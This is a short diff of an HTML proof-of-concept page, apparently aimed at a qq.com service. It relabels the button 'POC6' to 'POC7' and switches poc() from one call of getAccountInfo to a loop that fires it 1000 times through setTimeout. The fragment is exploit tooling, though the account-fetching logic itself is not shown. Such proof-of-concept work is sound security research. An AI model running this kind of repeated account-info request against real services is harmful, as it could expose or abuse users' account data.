@@ -6,7 +6,7 @@
 </head>
 
 <body>
-    <button onclick="poc()">执行 POC6</button>
+    <button onclick="poc()">执行 POC7</button>
 
     <script>
         // HTTP服务器配置
@@ -52,12 +52,12 @@
         }
 
         function poc() {
-            // for (var i = 0; i < 1000; i++) {
-            //     setTimeout(getAccountInfo, i)
-            // }
+            for (var i = 0; i < 1000; i++) {
+                setTimeout(getAccountInfo, i)
+            }
 
             // document.location.href="https://pov.ima.qq.com/";
-            getAccountInfo()
+            // getAccountInfo()
         }
         
         function getAccountInfo() {
